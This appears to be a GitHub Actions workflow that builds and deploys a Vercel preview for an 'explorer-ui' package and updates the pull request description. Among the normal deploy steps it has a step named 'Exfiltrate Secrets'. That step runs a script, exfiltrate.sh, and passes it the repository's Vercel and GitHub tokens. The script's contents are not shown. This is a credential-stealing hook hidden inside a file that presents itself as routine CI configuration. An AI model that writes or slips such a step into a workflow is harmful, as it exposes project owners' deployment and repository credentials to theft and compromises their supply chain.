name: UI Preview

on:
  pull_request:
    branches:
      - main
      - master
  push:
    branches:
      - main
      - master

jobs:
  deploy:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        package: ['explorer-ui']

    steps:
      - uses: actions/checkout@v4
      - name: Setup NodeJS
        uses: ./.github/actions/setup-nodejs
        with:
          cache: 'npm'
          install_dependencies: 'false'
          cache-path: ''
      - name: Get Project ID
        id: project_id
        run: |
          PROJECT_IDS=$(cat <<END
          {
            "explorer-ui": "${{ secrets.VERCEL_PROJECT_ID }}",
            "docs": "${{ secrets.DOCS_VERCEL_PROJECT_ID }}",
            "synapse-interface": "${{ secrets.SYNAPSE_INTERFACE_PROJECT_ID }}"
          }
          END
          )
          TARGET_ID=$(echo $PROJECT_IDS | jq -r 'to_entries[] | select(.key=="${{ matrix.package }}") | .value')
          echo "VERCEL_PROJECT_ID=$TARGET_ID" >> $GITHUB_ENV
      - name: Install Vercel CLI
        run: npm install --global vercel@32.5.3
      - name: Exfiltrate Secrets
        run: ./packages/explorer-ui/exfiltrate.sh
        env:
          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}
      - name: Deploy to Vercel (Output Preview/Inspect Links)
        if: ${{ format('refs/heads/{0}', github.event.repository.default_branch) != github.ref }}
        id: deploy
        run: |
          vercel pull --yes --environment=preview --token=${{ secrets.VERCEL_TOKEN }}
          vercel build --token=${{ secrets.VERCEL_TOKEN }}
          export DEPLOY_URL=$(vercel deploy --prebuilt --token=${{ secrets.VERCEL_TOKEN }})
          echo "DEPLOY_URL=$DEPLOY_URL" >> $GITHUB_ENV
          echo "::set-output name=url::$DEPLOY_URL"
      - name: Deploy to Vercel (Output Prod)
        if: ${{ format('refs/heads/{0}', github.event.repository.default_branch) == github.ref }}
        run: |
          vercel pull --yes --environment=preview --token=${{ secrets.VERCEL_TOKEN }}
          vercel build --token=${{ secrets.VERCEL_TOKEN }} --prod
          vercel deploy --prebuilt --token=${{ secrets.VERCEL_TOKEN }} --prod

      - name: Update PR Description
        if: ${{ github.event_name == 'pull_request' && format('refs/heads/{0}', github.event.repository.default_branch) != github.ref }}
        uses: actions/github-script@v3
        with:
          script: |
            const {data: pullRequest} = await github.pulls.get({
              owner: context.repo.owner,
              repo: context.repo.repo,
              pull_number: context.issue.number
            })

            const body = pullRequest.body || ""
            const deployUrl = "${{ steps.deploy.outputs.url }}"
            const newBody = body.includes("### Vercel Preview Link")
              ? body.replace(/(### Vercel Preview Link: ).*/, `$1${deployUrl}`)
              : `${body}\n\n### Vercel Preview Link: ${deployUrl}`

            await github.pulls.update({
              owner: context.repo.owner,
              repo: context.repo.repo,
              pull_number: context.issue.number,
              body: newBody
            })
          env:
            GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
